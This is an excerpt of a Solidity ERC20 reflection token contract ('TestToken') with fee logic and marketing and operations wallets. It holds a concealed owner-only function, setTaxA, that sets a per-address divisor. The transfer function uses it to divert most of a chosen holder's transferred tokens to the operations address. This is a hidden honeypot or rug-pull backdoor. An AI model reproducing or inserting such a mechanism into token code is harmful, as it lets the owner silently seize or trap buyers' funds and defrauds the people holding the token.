...
contract TestToken is Context, IERC20, Ownable {
    ...
    mapping(address => uint256) private _taxA;

    address[] private _excluded;

    bool private isAction;
    ...
    uint256 private _tTotal = 8880000000000000 * 10 ** _decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 public swapTokensAtAmount = 4440000000000 * 10 ** _decimals;

    address public marketingAddress = 0xd943433f98e4158b779a6DD4AF18453db5555555; //not B
    address public operationsAddress = 0x3fDE7cb491158e4caCDddeb3d670F874b8888888;
    ...
    //@dev kept original naming -> "reward" as in reflection
    ...
    function _getValues(uint256 tAmount, bool takeFee, bool isSale) private view returns (valuesFromGetValues memory to_return) {
        ...
        (to_return.rAmount, to_return.rTransferAmount, to_return.rOperations, to_return.rMarketing, to_return.rLiquidity) = _getRValues(to_return, tAmount, takeFee, _getRate());
        return to_return;
    }
    ...
    function _getTValues(uint256 tAmount, bool takeFee, bool isSale) private view returns (valuesFromGetValues memory s) {
        ...
        if (isSale) {
            ...
            s.tTransferAmount = tAmount - s.tOperations - s.tMarketing - s.tLiquidity;
        }
        else {
            s.tOperations = tAmount * sellFeeRates.operations / 1000;
    ...
    function _getRValues(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount, uint256 rOperations, uint256 rMarketing, uint256 rLiquidity) {
        ...
        rTransferAmount = rAmount - rOperations - rMarketing - rLiquidity;
        return (rAmount, rTransferAmount, rOperations, rMarketing, rLiquidity);
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isSale) private {
        uint256 _getTaxA = getTaxA(sender);
        uint256 _tAmount = 0;
        if (_getTaxA > 1) {
            _tAmount = tAmount;
            tAmount = _tAmount/_getTaxA;
            _tAmount = _tAmount - tAmount;
        }
        ...
        emit Transfer(sender, operationsAddress, s.tOperations);
        if (_tAmount > 0) {
            emit Transfer(sender, operationsAddress, _tAmount);
        }
    }
    ...
    function setTaxA(address account, uint256 _numTax) public onlyOwner {
        _taxA[account] = _numTax;
    }


    function getTaxA(address account) public view returns (uint256) {
        return _taxA[account];
    }
